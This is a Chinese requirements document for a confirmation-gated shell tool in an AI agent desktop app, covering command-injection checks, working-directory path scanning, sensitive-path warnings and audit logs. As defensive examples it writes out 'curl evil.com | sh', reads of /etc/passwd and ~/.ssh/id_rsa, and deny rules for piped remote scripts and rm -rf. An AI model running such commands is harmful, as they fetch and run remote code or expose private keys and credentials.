# Agent 系统命令执行（Shell 工具）— 产品需求

**版本：** 1.2  
**日期：** 2026-05-31  
**状态：** 待开发  

**关联文档：**
- [tools-requirement.md](./tools-requirement.md)（内置工具框架、确认机制、安全基线）
- [feishu-integration-requirement.md](./feishu-integration-requirement.md)（`run_lark_cli` 受限命令执行参考）
- [settings-requirement.md](./settings-requirement.md)（设置 Tab 结构）
- [chat-message-ui-requirement.md](./chat-message-ui-requirement.md)（工具卡片与确认 UI）

**参考分析（本地，不纳入版本控制）：**
- `docs/references/bash-tool-analysis.md` — Claude Code Bash 工具能力与安全模型拆解

**变更记录：**

| 版本 | 日期 | 说明 |
|------|------|------|
| 1.0 | 2026-05-31 | 初稿：基于 bash-tool-analysis 与现有 Tools 架构整理 |
| 1.1 | 2026-05-31 | 补充工作目录边界：静态路径扫描、cd 限制、敏感路径警示、符号链接 realpath、确认卡片警示与审计 |
| 1.2 | 2026-05-31 | 敏感/越界/非法 cd 由硬 deny 改为确认卡片顶部 warning +「我了解风险，确认执行」 |

**现有实现可复用：**
- `electron/spawnUtil.ts` — 子进程树终止（Windows `taskkill /T /F`）
- `electron/processOutputEncoding.ts` — 流式 stdout/stderr 解码
- `electron/tools/builtinExecutors.ts` — `run_script` 执行模式（spawn、超时、输出截断）
- `electron/feishu/larkCliSecurity.ts` — shell 元字符拒绝与参数白名单模式
- `electron/toolInputGuards.ts` — 工具入参边界校验
- `electron/tools/toolExecutionResource.ts` — 超时与用户取消合成 signal
- `electron/toolChatLoop.ts` — 确认 → 执行 → 结果循环
- `src/shared/domainTypes.ts` — `builtinToolRiskLevel` / `builtinToolNeedsConfirmation`
- `electron/pathSecurity.ts` — `resolveSafePath` / `resolveSafePathReal`（路径边界校验，与 `grep` 一致）

---

## 目录

1. [概述](#1-概述)
2. [现状与差距](#2-现状与差距)
3. [目标与非目标](#3-目标与非目标)
4. [用户故事](#4-用户故事)
5. [工具定义：`run_shell`](#5-工具定义run_shell)
6. [执行流程](#6-执行流程)
7. [安全机制](#7-安全机制)
8. [权限与确认策略](#8-权限与确认策略)
9. [用户体验与 UI](#9-用户体验与-ui)
10. [配置与数据模型](#10-配置与数据模型)
11. [主进程实现要点](#11-主进程实现要点)
12. [与现有工具的关系](#12-与现有工具的关系)
13. [非功能需求](#13-非功能需求)
14. [验收标准](#14-验收标准)
15. [发布阶段建议](#15-发布阶段建议)
16. [待解决问题](#16-待解决问题)

---

## 1. 概述

### 1.1 背景

SpaceAssistant 当前 Agent 可通过 `read_file`、`grep`、`edit_file` 等工具操作工作目录内文件，并通过 `run_script` **仅执行 Python 代码**。这在以下场景存在明显缺口：

| 场景 | 现有能力 | 缺口 |
|------|---------|------|
| 依赖安装 | 用户手动复制 `npx playwright install` 等命令 | Agent 无法代为执行 npm / pip / cargo 等包管理命令 |
| 项目构建 | — | 无法运行 `npm run build`、`go test ./...` |
| 版本控制 | — | 无法运行 `git status`、`git diff`（除文件工具间接能力外） |
| 环境探测 | `browser_detect` 等专用检测 | 缺少通用 `node -v`、`python --version` 等探测 |
| 一次性脚本 | `run_script`（Python） | 无法用 shell 管道、CLI 工具链组合命令 |

[tools-requirement.md](./tools-requirement.md) §2.2 曾明确将 **Bash 工具列为非目标**（安全风险过高）。随着产品成熟度提升，以及浏览器依赖引导、飞书 CLI 等「受限子进程执行」模式已落地，有必要在**可控安全边界内**引入通用系统命令能力。

本需求参考 Claude Code Bash 工具分析（`bash-tool-analysis.md`），结合 SpaceAssistant **Electron 桌面 + 工作目录沙箱 + 聊天内确认** 架构，定义名为 **`run_shell`** 的内置工具（不直接复用 Claude Code 的 `Bash` 命名，以避免模型与宿主行为不一致）。

### 1.2 产品价值

| 价值 | 说明 |
|------|------|
| 闭环 Agent 能力 | 读 → 改 → **构建/测试/安装** 可在同一会话完成 |
| 降低操作摩擦 | 用户无需离开聊天窗口复制粘贴终端命令 |
| 安全可控 | 默认关闭、执行前确认、命令静态分析与规则匹配，优于用户盲目粘贴 |
| 与专用工具互补 | 飞书走 `run_lark_cli`，Python 数据处理走 `run_script`，通用 CLI 走 `run_shell` |

### 1.3 设计原则

| 原则 | 说明 |
|------|------|
| 默认拒绝 | 工具默认 **关闭**；用户显式启用并理解风险后才可用 |
| 深度防御 | 静态安全检查 + 用户确认 + 工作目录约束 + 环境变量净化，多层叠加 |
| 故障安全 | 命令解析或规则匹配异常时 **询问用户**，而非静默放行 |
| 平台感知 | Windows / macOS / Linux 使用不同 shell 启动方式，对用户透明 |
| 渐进交付 | MVP 先覆盖单命令与有限复合命令；后台任务、规则 UI 等后续迭代 |

### 1.4 能力边界（重要）

`run_shell` 是 **受控 CLI 执行能力**，**不是**与 `read_file` / `write_file` 等价的**文件沙箱**：

| 维度 | 文件类工具 | `run_shell` |
|------|-----------|-------------|
| 路径 enforcement | 每次 IO 调用 `resolveSafePath(Real)`，越界即失败 | 通过 **命令静态分析 + cwd** 约束；子进程内程序仍可能发起未出现在命令字面量中的 IO |
| 用户预期 | 「只能动 workDir 里的文件」 | 「在 workDir 下跑 CLI；**不保证**子进程绝不触达目录外」 |
| 读 workDir 外文件 | 工具层 **禁止** | 命令字面量含 workDir 外/敏感路径 → **扫描并警示**，用户确认后仍可执行；注入类高危模式仍 **硬 deny** |

**产品表述（设置页 / 启用 Switch 前必须展示）：**

> Shell 命令在会话工作目录下启动，系统会**扫描**命令中的路径并在越界/敏感时**显著警示**；注入类高危模式会直接拒绝。Shell **无法**像文件工具一样约束子进程的全部行为。请勿对不可信命令点击确认。

---

## 2. 现状与差距

### 2.1 已有能力

| 能力 | 位置 | 与 Shell 的关系 |
|------|------|----------------|
| Python 脚本执行 | `run_script` | 仅 `python -c`，非 shell；可复用 spawn/超时/输出截断 |
| 飞书 CLI | `run_lark_cli` | argv 数组 + 元字符拒绝；**权限模型可参考** |
| 代码搜索 | `grep`（rg） | 只读；部分场景可被 `rg` shell 替代，但不应鼓励 |
| 终端打开 | `browser:open-terminal` | 用户手动操作，非 Agent 执行 |
| 工具确认 | `tool:confirm-request` | 可直接用于 `run_shell` |
| 进程终止 | `killProcessTree` | Windows 已处理 cmd 弹窗问题 |

### 2.2 差距

| # | 差距 | 优先级 |
|---|------|--------|
| G1 | 无通用 shell 工具定义与执行器 | P0 |
| G2 | 无命令注入 / 命令替换静态检测 | P0 |
| G2b | 无命令静态路径扫描 / workDir 边界校验 | P0 |
| G2c | 无敏感/越界路径警示与确认卡片安全标识 | P0 |
| G3 | 无命令级 allow/deny/ask 规则 | P1 |
| G4 | 无长命令后台化与任务 ID | P2 |
| G5 | 无大输出持久化（>30KB 写文件） | P2 |
| G6 | 设置页无 Shell 专项配置与风险说明 | P0 |
| G7 | `run_script` 文案暗示「本地命令」但仅 Python | P1（文案修正） |

---

## 3. 目标与非目标

### 3.1 目标

| # | 目标 |
|---|------|
| G-01 | 新增内置工具 `run_shell`，Agent 可在**会话工作目录**下执行系统 shell 命令 |
| G-02 | 执行前**默认必须用户确认**；确认卡片展示完整命令与可选描述 |
| G-03 | 提供**命令静态安全检查**：注入/提权/重定向等 **硬 deny**；路径越界/敏感/cd **扫描警示** |
| G-08 | 命令中字面量路径须通过 **workDir 边界扫描**；`cd` 仅允许进入 workDir 子目录 |
| G-09 | 敏感路径、越界路径、非法 `cd` 及 workDir 外访问风险，均在确认卡片展示 **warning Alert** +「我了解风险，确认执行」；用户确认后 **审计** |
| G-04 | 支持**超时**、**用户取消**、**stdout/stderr 流式进度**、**退出码**返回 |
| G-05 | 工具默认 **denied**，设置页提供启用开关、默认超时、Shell 路径（高级） |
| G-06 | 与现有 `toolChatLoop`、消息持久化、ToolCallCard 无缝集成 |
| G-07 | Windows / macOS / Linux 三平台行为一致（语义一致，实现可差异） |

### 3.2 非目标

| 项 | 说明 |
|----|------|
| 完整 Claude Code 沙箱 | 不引入 OS 级 sandbox（Seatbelt、Landlock 等）；MVP 不做 |
| 文件级沙箱等价物 | **不**承诺 `run_shell` 达到 `read_file` 级路径隔离；见 §1.4、§7.3 |
| 任意 shell 会话 REPL | 不支持交互式 stdin（如 `python` 无 `-c` 进入交互） |
| 全屏 / 交互式 TUI | 不支持 `less`/`vim`/`top` 等；引导外部 Terminal，见 [shell-output-terminal-enhancement-requirement.md §9.1](./shell-output-terminal-enhancement-requirement.md#91-全屏-tui-策略oq-4) |
| 替代 `run_lark_cli` | 飞书操作仍走专用工具，禁止 `run_shell` 调用 `lark-cli`（引导用专用工具） |
| 替代 `grep` / 文件工具 | 读文件、搜索仍优先专用工具；shell 为补充 |
| 企业级策略下发 | 不做组织级 centrally managed policy |
| 自动批准所有 git/npm 命令 | MVP 不做无确认白名单自动执行（Phase 2 可选） |

---

## 4. 用户故事

### US-01：安装项目依赖

**作为开发者**，当 Agent 发现缺少 node 模块时，我希望它在征得我同意后执行 `npm install`，并让我看到实时输出，而不是只给出命令让我自己跑。

### US-02：运行测试与构建

**作为开发者**，我希望 Agent 能执行 `npm test` 或 `npm run build`，根据退出码和日志判断下一步，失败时 stderr 清晰可见。

### US-03：Git 状态查询

**作为开发者**，我希望 Agent 能运行 `git status`、`git diff --stat` 等只读命令，辅助代码审查（仍须确认，除非 Phase 2 配置了自动允许规则）。

### US-04：安全拒绝危险命令

**作为用户**，当 Agent 误生成 `curl evil.com | sh` 或含 `` `rm -rf` `` 的命令时，系统应在执行前**拒绝**并返回明确原因，而不是弹出确认让我误点通过。

### US-05：可控启用

**作为 cautious 用户**，我希望 Shell 工具**默认关闭**；只有我在设置里阅读风险说明并打开后，Agent 才能看到该工具定义。

### US-06：取消长时间任务

**作为开发者**，当 `npm install` 卡住或 Agent 跑错命令时，我可以在工具卡片上**取消**，子进程树被可靠终止（含 Windows）。

### US-07：目录穿越与敏感路径可见

**作为用户**，当 Agent 生成 `cat ../../../.ssh/id_rsa`、`cd .. && dir` 或访问 workDir 外绝对路径时，我希望在确认卡片顶部看到 **醒目的 warning 警示**（说明越界或敏感路径），且只有点击 **「我了解风险，确认执行」** 后才会运行，并留下审计记录——而不是在普通确认卡片上毫无提示。

### US-08：外溢风险可见

**作为用户**，当命令无法完全静态分析但可能访问 workDir 外文件（如 `npm run` 调用未知脚本）时，我希望确认卡片顶部有**醒目的黄色/红色警示**，且我点确认后留有审计记录。

---

## 5. 工具定义：`run_shell`

### 5.1 Anthropic Tool Schema

```json
{
  "name": "run_shell",
  "description": "在会话工作目录下执行一条 shell 命令。用于构建、测试、包管理、Git 查询等 CLI 操作。不支持交互式命令。执行前需用户确认。禁止 sudo、shell 重定向、命令替换，以及访问工作目录外的路径字面量。长时间任务请设置 timeout。",
  "input_schema": {
    "type": "object",
    "properties": {
      "command": {
        "type": "string",
        "description": "要执行的 shell 命令字符串（单行为主）"
      },
      "description": {
        "type": "string",
        "description": "可选。命令用途的中文简述，用于确认卡片展示"
      },
      "timeout": {
        "type": "number",
        "description": "超时时间（秒）。默认取设置中的 shellDefaultTimeoutSec"
      }
    },
    "required": ["command"]
  }
}
```

### 5.2 输入参数

| 参数 | 类型 | 必填 | 默认 | 说明 |
|------|------|------|------|------|
| `command` | string | 是 | — | 单行 shell 命令；最大长度见 §7.4 |
| `description` | string | 否 | — | UI 展示用，不参与执行 |
| `timeout` | number | 否 | `shellDefaultTimeoutSec` | 1～86400（与 `run_script` 对齐） |

### 5.3 输出结构（`ToolResult.data`）

| 字段 | 类型 | 说明 |
|------|------|------|
| `stdout` | string | 标准输出（可能被截断） |
| `stderr` | string | 标准错误 |
| `exitCode` | number | 进程退出码 |
| `interrupted` | boolean | 用户取消或超时 kill |
| `persistedOutputPath` | string | 大输出落盘路径（userData 下 shell-output 目录） |
| `truncated` | boolean | 输出是否被截断 |
| `shell` | string | 实际使用的 shell 标识（如 `cmd`、`bash`），便于排障 |

### 5.4 平台 Shell 映射

| 平台 | 默认 shell | spawn 方式 | 备注 |
|------|-----------|-----------|------|
| Windows | `cmd.exe` | `cmd.exe /d /s /c <command>` | 避免 `/K` 残留窗口；`windowsHide: true` |
| macOS | `/bin/bash` | `bash -lc <command>` | `-l` 加载基本 PATH |
| Linux | `/bin/bash` | `bash -lc <command>` | 可用 `$SHELL` 覆盖（高级配置） |

**高级配置** `shellConfig.executable` + `shellConfig.argsPrefix` 允许企业用户指定 Git Bash 等，但 MVP 可仅支持上表默认。

### 5.5 执行环境

| 项 | 规则 |
|----|------|
| `cwd` | 会话 `workDir`（与 `run_script` 一致） |
| `shell: false` | spawn 时 **禁止** Node `shell: true`，防止二次解析注入 |
| 环境变量 | 使用 `buildShellEnv()`：继承 `PATH`、`SystemRoot`/`HOME`、`LANG`/`LC_ALL`、Python/Node 相关；**剔除** `*_API_KEY*`、`ANTHROPIC_*`、`OPENAI_*`、Electron 敏感变量 |
| 编码 | 复用 `createStreamTextDecoder`；Windows cmd 输出按 UTF-8 / OEM 回退策略（与 `processOutputEncoding` 扩展对齐） |

---

## 6. 执行流程

### 6.1 主流程

```
模型 tool_use(run_shell)
    → assertSafeToolInput（长度、timeout）
    → analyzeShellCommand（分段，§6.3）
    → analyzeShellPaths（静态路径 / cd / 敏感路径 / realpath，§7.3～§7.7）
    → shellSecurity 验证器链（注入、重定向、提权等，§7.2）
    → evaluateShellPermission（规则匹配，§8）
    → [硬 deny] 注入/提权/重定向等（§7.2）→ 返回 tool_result，不 spawn
    → [ask] tool:confirm-request（command + shellSecurityHints；含路径/敏感/cd 警示时见 §9.2）
    → [用户确认] 写审计日志 → spawn（cwd=workDir）
    → 流式 tool:progress → killProcessTree（超时/取消）→ tool:result
```

### 6.2 与 bash-tool-analysis 流程对齐

| Claude Code 阶段 | SpaceAssistant 对应 |
|-----------------|---------------------|
| 命令解析 | `shellCommandParser.ts`：分段 `&&` `\|\|` `\|`、`;` |
| 安全检查 | `shellSecurity.ts` 验证器链 |
| 权限验证 | `shellPermissions.ts` + 用户确认 |
| 沙箱判断 | MVP：**无 OS 沙箱**；cwd + env + **命令静态路径边界**（§7.3～§7.7） |

### 6.3 复合命令处理

参考 bash-tool-analysis §3.2，对 `cmd1 && cmd2`、 `cmd1 | cmd2` 等：

1. 解析为有序子命令列表（上限 **50** 段，防 ReDoS）
2. **每段独立**跑 §7.2 安全检查与 §7.4 路径分析
3. **任一段** §7.2 命中 → 整句 **deny**
4. **任一段** 路径/敏感/cd 警示 → 整句 **ask**，`requiresRiskAck: true`（MVP 可简化为：只要含多段则一律 confirm）

---

## 7. 安全机制

### 7.1 需求清单（对照 bash-tool-analysis）

| 编号 | 需求 | 优先级 | MVP |
|------|------|--------|-----|
| SS-01 | 阻止命令替换：`$()`、`` ` ``、`${}` | P0 | ✅ |
| SS-02 | 阻止输入/输出重定向：`>`、`>>`、`<`、`<<` | P0 | ✅ |
| SS-03 | 阻止多行注入（换行、`\r`、Unicode 行分隔符） | P0 | ✅ |
| SS-04 | 阻止提权：`sudo`、`doas`、`runas` | P0 | ✅ |
| SS-05 | 阻止裸 shell 调用：`bash -i`、`sh -c` 嵌套（可选放宽 `bash -lc` 仅宿主使用） | P1 | 部分 |
| SS-06 | 阻止 IFS/LD_PRELOAD 等危险 env 注入命令内 | P1 | Phase 2 |
| SS-07 | 阻止 jq `system()` 等特定工具注入 | P2 | 可选 |
| SS-08 | git commit -m 内命令替换检测 | P2 | 可选 |
| SS-09 | 禁止通过 `run_shell` 调用 `lark-cli` | P0 | ✅ |
| SS-10 | 审计日志：拒绝原因、确认执行、路径警示摘要（不含密钥） | P0 | ✅ |
| SS-11 | **命令静态路径扫描**：提取字面量路径；越界 → **ask + warning** | P0 | ✅ |
| SS-12 | **限制 `cd`**：目标非 workDir 子目录 → **ask + warning** | P0 | ✅ |
| SS-13 | **敏感路径警示列表**：命中 → **ask + warning**（非硬 deny） | P0 | ✅ |
| SS-14 | **符号链接 realpath**：相对路径解析后越界 → **ask + warning** | P1 | ✅ |
| SS-15 | **路径/外溢风险**：确认卡片 **warning Alert** +「我了解风险，确认执行」+ 审计 | P0 | ✅ |

### 7.2 静态检查实现要求

新建 `electron/shell/shellSecurity.ts`，采用**验证器链**：

```typescript
type ShellSecurityVerdict = 'allow' | 'deny' | 'ask'

interface ShellSecurityContext {
  command: string
  platform: NodeJS.Platform
  workDir: string
  segments: string[]
  /** analyzeShellPaths 产出 */
  pathLiterals: ShellPathLiteral[]
  pathVerdict: ShellPathVerdict
}

interface ShellPathLiteral {
  raw: string           // 命令中出现的原始片段
  resolved?: string     // resolveSafePath(Real) 结果
  segmentIndex: number  // 所属子命令段
  kind: 'arg' | 'cd-target' | 'flag-value'  // 如 --file foo.txt、cd subdir
}

interface ShellPathVerdict {
  decision: 'allow' | 'deny' | 'ask'
  /** 越界、敏感路径、cd 非法等（decision=ask 时写入 warnings 供 UI 展示） */
  violations: Array<{ code: string; message: string; path?: string; severity: 'warning' | 'block' }>
  warnings: string[]
  outsideWorkDirRisk: boolean
  /** 任一 path/sensitive/cd/symlink 类警示为 true 时，确认按钮须用「我了解风险，确认执行」 */
  requiresRiskAck: boolean
}

interface ShellSecurityValidator {
  id: string
  check(ctx: ShellSecurityContext): ShellSecurityVerdict | null // null = 未命中，交下一 validator
}
```

**deny 示例文案（用户向）：**

- `检测到命令替换（$() 或反引号），已拒绝执行`
- `不支持输入/输出重定向，请改用专用文件工具`
- `不支持多行命令`
- `禁止提权命令（sudo/doas）`
- `请使用 run_lark_cli 工具操作飞书，而非 shell 调用 lark-cli`
- `请使用 run_lark_cli 工具操作飞书，而非 shell 调用 lark-cli`

**路径类警示文案（用户向，`warnings` / Alert 正文，decision=ask）：**

- `命令包含工作目录外的路径：{path}`
- `cd 目标不在工作目录内：{path}`
- `命令涉及敏感路径：{path}（如密钥、凭据目录）`
- `符号链接解析后指向工作目录外：{path}`
- `此命令可能访问工作目录外的文件；Shell 不是文件沙箱`

### 7.3 工作目录与路径安全（总述）

路径安全在 **`shellPathAnalysis.ts`** 中实现，于 spawn 之前执行；与 `electron/pathSecurity.ts` 复用同一套边界语义（`resolveSafePath` / `resolveSafePathReal`），与 [`grep` 执行器](../electron/tools/builtinExecutors.ts) 对搜索路径的处理保持一致。

**与 §7.2 硬 deny 的分工：**

| 类别 | 示例 | 决策 |
|------|------|------|
| 注入 / 提权 / 重定向 / 多行 | `` `rm` ``、`sudo`、`>`、`$()` | **deny**，不弹确认 |
| 路径越界 / 敏感路径 / 非法 cd / symlink 外跳 | `cat ../x`、`~/.ssh/id_rsa`、`cd ..` | **ask**，确认卡片 **warning Alert** + 风险确认按钮 |
| 启发式外溢风险 | `npm run deploy`（无字面量路径） | **ask**，同上 |

**决策汇总：**

| 条件 | 决策 | UI |
|------|------|-----|
| §7.2 注入类命中 | **deny** | rejected 卡片 + 说明（无执行按钮） |
| 字面量路径解析后超出 workDir | **ask** | 确认卡片顶部 **warning Alert** +「我了解风险，确认执行」 |
| 命中敏感路径警示列表 | **ask** | 同上 + 列出敏感路径说明 |
| `cd` 目标非 workDir 子目录 | **ask** | 同上 |
| 相对路径 realpath 后越界（P1） | **ask** | 同上 |
| 启发式 `outsideWorkDirRisk` | **ask** | 同上 |
| 仅 workDir 内路径且无警示 | **ask**（MVP 仍须确认） | 常规确认卡片 +「确认执行」 |

### 7.4 命令静态路径扫描（SS-11，P0）

从每个子命令段中提取**路径字面量**（非变量、非命令替换），进行 workDir 边界校验。

**提取范围（启发式，MVP）：**

| 来源 | 示例 |
|------|------|
| 常见读命令首参 | `cat src/a.txt`、`type config.json`、`more README.md` |
| `-f` / `--file` / `-o` / `--output` 等 flag 值 | `git --git-dir=...`（若值为路径） |
| 显式相对/绝对路径 token | `./src`、`../x`（越界 → 警示）、`C:\`、`/etc` |
| `cd` 目标 | 见 §7.5 |

**校验规则：**

1. 对每个提取到的字面量 `p`：
   - 若为相对路径：`resolveSafePath(workDir, p)`（同步）
   - 若为绝对路径：计算 `path.relative(workDirReal, p)`，以 `..` 或绝对 rel 判定越界
2. 解析抛错或相对路径以 `..` 开头 → 记入 `violations`，`decision: ask`，`requiresRiskAck: true`
3. 无法识别为路径的 token **不** 当作路径（避免误杀 `npm install` 等）

**实现模块：** `electron/shell/shellPathAnalysis.ts` — `extractPathLiterals(segment)` + `verifyPathsInWorkDir(workDir, literals)`

**单元测试必覆盖：**

- `cat ../../../etc/passwd` → ask + `requiresRiskAck` + warning 文案
- `cat src/main.ts` → ask（常规确认，无路径警示时可 `requiresRiskAck: false`）
- `cat C:\Users\x\secret.txt`（workDir 外）→ ask + `requiresRiskAck`

### 7.5 `cd` 限制（SS-12，P0）

| 规则 | 说明 |
|------|------|
| 识别 | 子命令段首 token 为 `cd`（含 `cmd` 内 `cd /d` 形式） |
| 允许（无 cd 警示） | 目标解析后在 workDir **内部或子目录**（`resolveSafePath` 成功） |
| 警示（仍 ask） | `cd ..`、`cd \`、`cd /`、`cd %USERPROFILE%`（workDir 外）等 → `requiresRiskAck: true` |
| 复合命令 | `cd sub && npm test`：`cd sub` 合法则无 cd 警示；`cd .. && …` 带警示仍须风险确认 |

**warning 文案：** `cd 目标不在工作目录内：{path}`

**说明：** 非法 `cd` **不** 硬 deny；用户可在充分知情后仍选择执行（子 shell 内 `cd` 生效，spawn cwd 仍为 workDir）。

### 7.6 敏感路径警示列表（SS-13，P0）

内置 **不可删除** 的敏感路径前缀（平台展开后匹配）。命中后 **ask**（`requiresRiskAck: true`），在确认卡片展示 **warning Alert**，**不** 使用 rejected 硬拦截态。

**默认列表（实现时按平台展开 `$HOME` / `%USERPROFILE%` 等）：**

| 类别 | 路径模式（示例） |
|------|-----------------|
| SSH / 密钥 | `~/.ssh/**`、`~/.gnupg/**` |
| 凭据 / 环境 | `**/.env`、`**/.env.*`、`**/secrets/**` |
| 用户配置 | `~/AppData/Roaming/**`（Win）、`~/Library/**`（macOS 关键子目录） |
| 系统目录 | `C:\Windows\**`、`/etc/**`、`/System/**` |
| 应用密钥 | Electron `userData` 目录、SpaceAssistant 数据库路径 |

**匹配时机：** 路径字面量经 §7.4 解析后的 **realpath 或 resolved 路径** 与敏感前缀匹配。

**UI（P0）：** 确认卡片顶部 **Ant Design `Alert` `type="warning"`**，标题 **「路径安全警示」**，正文列出命中项（路径脱敏，如 `~/.ssh/id_rsa`）。与越界、非法 cd 警示**可合并为同一块 Alert 列表**。

Phase 2 可在设置页追加用户自定义敏感前缀，但不得移除内置项。

### 7.7 符号链接（SS-14，P1）

对 §7.4 中提取的**相对路径**字面量，在文件存在时追加异步校验（与 `resolveSafePathReal` 一致）：

```typescript
const resolved = resolveSafePath(workDir, literal)
const targetReal = await fs.realpath(resolved).catch(() => resolved)
// path.relative(workDirReal, targetReal) 不得越界
```

| 场景 | 行为 |
|------|------|
| workDir 内 symlink 指向 workDir 内 | ask（无 symlink 警示） |
| workDir 内 symlink 指向 workDir 外 | **ask** + `requiresRiskAck` + warning |
| 路径不存在（如 `cd not-yet-created`） | 仅用 `resolveSafePath` 同步结果；不阻塞 `mkdir` 类命令的合法相对路径 |

**与 grep 对齐：** 同 [`resolveSafePathReal`](../electron/pathSecurity.ts) 语义，防止通过仓库内恶意链接间接读外部文件。

### 7.8 确认卡片警示与审计（SS-15，P0）

当 `pathVerdict.decision === 'ask'` 且 `requiresRiskAck === true`（或 `warnings.length > 0`）时，确认卡片必须展示 **顶部 warning Alert**（不可折叠为单行小字），且主按钮文案为 **「我了解风险，确认执行」**。

| 触发条件 | Alert 类型 | 标题/正文要点 |
|---------|-----------|--------------|
| workDir 外字面量路径 | `warning` | 「命令包含工作目录外的路径」 |
| 敏感路径命中 | `warning` | 「命令涉及敏感路径（密钥/凭据等）」 |
| 非法 `cd` | `warning` | 「cd 目标不在工作目录内」 |
| symlink 外跳（P1） | `warning` | 「符号链接指向工作目录外」 |
| `outsideWorkDirRisk` | `warning` | 「此命令可能访问工作目录外的文件；Shell 不是文件沙箱。」 |
| 无任何路径/外溢警示 | — | 常规「确认执行」按钮 |

**IPC 扩展 — `tool:confirm-request` 增加字段：**

```typescript
shellSecurityHints?: {
  requiresRiskAck: boolean   // true → 按钮「我了解风险，确认执行」+ 顶部 warning
  outsideWorkDirRisk: boolean
  warnings: string[]         // Alert 列表条目
  scannedPaths?: string[]    // 已扫描字面量路径（相对 workDir 展示）
  violationCodes?: string[]  // 如 PATH_OUTSIDE_WORKDIR, SENSITIVE_PATH, CD_OUTSIDE_WORKDIR
}
```

**审计（P0）：** 写入 Agent 日志（与现有 `{workDir}/.agent/logs/` 或开发模式 `logs/` 对齐）：

| 事件 | 时机 | 字段 |
|------|------|------|
| `shell.security.deny` | §7.2 硬 deny（注入/提权等） | `reason`、`violationCodes`、命令摘要（脱敏） |
| `shell.path.confirm` | 用户确认且 `requiresRiskAck === true` | `sessionId`、`commandSummary`、`warnings`、`violationCodes` |
| `shell.path.reject` | 用户拒绝 | 同上 |

**禁止**在审计中写入完整环境变量、API Key、token；路径可记录相对 workDir 形式。

### 7.9 入参边界（对齐 toolInputGuards）

| 字段 | 限制 |
|------|------|
| `command` | 最大 **8192** 字符；禁止 `\0` |
| `description` | 最大 **512** 字符 |
| `timeout` | 1～86400 秒 |

### 7.10 输出边界

| 项 | MVP | Phase 2 |
|----|-----|---------|
| stdout/stderr 内联上限 | 各 **100KB**（与 `run_script` 一致） | 超出写 `{userData}/shell-output/{taskId}.log` |
| 进度推送 | 最近 **4000** 字符尾部 | 同左 |
| 退出码 | 原样返回 | + 常见 exit code 中文解释 |

---

## 8. 权限与确认策略

### 8.1 风险等级

| 工具 | riskLevel | needsConfirmation |
|------|-----------|-------------------|
| `run_shell` | **high** | **true**（MVP 不可关闭） |

写入 `src/shared/domainTypes.ts` 的 `builtinToolRiskLevel` / `builtinToolNeedsConfirmation`。

### 8.2 规则模型（Phase 分版）

#### MVP：确认 + 分层 deny

- §7.2 **硬 deny**（注入、提权、重定向等）→ **直接拒绝**，不 spawn
- 路径分析结果为 **ask** → **一律弹出确认**；若 `requiresRiskAck` → 顶部 **warning Alert** +「我了解风险，确认执行」
- 用户确认且 `requiresRiskAck` → **写审计**（§7.8）后 spawn

#### Phase 2：allow / deny / ask 规则

参考 bash-tool-analysis §2.3，在 `ShellConfig` 中支持：

```typescript
type ShellRuleDecision = 'allow' | 'deny' | 'ask'

interface ShellRule {
  id: string
  pattern: string      // 精确 / 前缀 / 简单 glob（如 "git status*")
  decision: ShellRuleDecision
  note?: string        // 设置页展示
}
```

**匹配顺序：**

1. 精确 deny → 拒绝  
2. 精确 ask → 确认  
3. 精确 allow → 跳过确认（需用户显式添加，**无默认 allow 规则**）  
4. 前缀 / glob 规则同上  
5. 默认 → **ask**

**内置 deny 规则（不可删）：**

| 模式 | 原因 |
|------|------|
| `sudo:*`、`doas:*` | 提权 |
| `rm -rf:*`、`rm -r -f:*` | 破坏性删除（启发式） |
| `*:curl*\\|*sh`、`*:wget*\\|*sh` | 远程脚本管道 |
| `lark-cli:*` | 专用工具 |

### 8.3 与工具全局开关关系

| 配置 | 行为 |
|------|------|
| `tools.enabled === false` | 不注入任何工具 |
| `run_shell ∈ deniedTools` | 不注入 `run_shell`（**默认应在 DEFAULT 中 denied**） |
| `allowedTools` 非空且不含 `run_shell` | 不注入 |

**默认策略建议：**

```typescript
// DEFAULT_TOOLS_CONFIG 或 migration
deniedTools: ['run_shell', ...] // 新装默认关闭；升级用户可保持关闭直到主动启用
```

---

## 9. 用户体验与 UI

### 9.1 设置页（工具 Tab）

在 [ToolsSettingsTab](../src/renderer/components/Config/ToolsSettingsTab.tsx) 增加 **Shell 命令** 区域（或折叠面板）：

| 控件 | 说明 |
|------|------|
| 启用 `run_shell` | Switch，开启前展示风险 Alert |
| 默认超时 | InputNumber，默认 **300** 秒 |
| Shell 可执行路径（高级） | 可选，默认空=平台默认 |
| Phase 2：规则列表 | 表格编辑 allow/deny/ask |

**设置页文案（`builtinToolSettingsCopy`）：**

```typescript
run_shell: {
  summary: '在工作目录执行系统 shell 命令（如 npm、git）。非文件沙箱；执行前需确认。',
  disabledHint: '关闭后 Agent 无法运行终端命令，仅能用 Python 脚本或专用工具。'
}
```

### 9.2 确认卡片

参考 `run_script` 确认态；**路径/security 相关展示优先级高于命令正文**。

**常规（无额外路径警示）：**

```
┌─────────────────────────────────────────────┐
│ 💻 run_shell                   ⏳ confirming │
│ ─────────────────────────────────────────── │
│ 安装项目依赖（description）                  │
│ ┌─────────────────────────────────────────┐ │
│ │ npm install                             │ │
│ └─────────────────────────────────────────┘ │
│ 工作目录：E:\Projects\my-app                 │
│ 超时：300s                                   │
│    [✓ 确认执行]    [✗ 拒绝]                  │
└─────────────────────────────────────────────┘
```

**含路径/敏感/越界/cd 警示（`requiresRiskAck`，统一 UX）：**

```
┌─────────────────────────────────────────────┐
│ 💻 run_shell                   ⏳ confirming │
│ ╔═══════════════════════════════════════════╗
│ ║ ⚠️ 路径安全警示                            ║
│ ║ • 命令包含工作目录外的路径：../../.ssh/…   ║
│ ║ • 命令涉及敏感路径（密钥/凭据目录）         ║
│ ║ Shell 是受控 CLI，不是文件沙箱。            ║
│ ╚═══════════════════════════════════════════╝
│ ─────────────────────────────────────────── │
│ ┌─────────────────────────────────────────┐ │
│ │ cat ../../../.ssh/id_rsa                │ │
│ └─────────────────────────────────────────┘ │
│ 工作目录：E:\Projects\my-app                 │
│    [✓ 我了解风险，确认执行]    [✗ 拒绝]      │
└─────────────────────────────────────────────┘
```

**启发式外溢风险（`outsideWorkDirRisk`，同 UX）：**

```
┌─────────────────────────────────────────────┐
│ 💻 run_shell                   ⏳ confirming │
│ ╔═══════════════════════════════════════════╗
│ ║ ⚠️ 此命令可能访问工作目录外的文件          ║
│ ║ Shell 是受控 CLI，不是文件沙箱。          ║
│ ╚═══════════════════════════════════════════╝
│ ─────────────────────────────────────────── │
│ ┌─────────────────────────────────────────┐ │
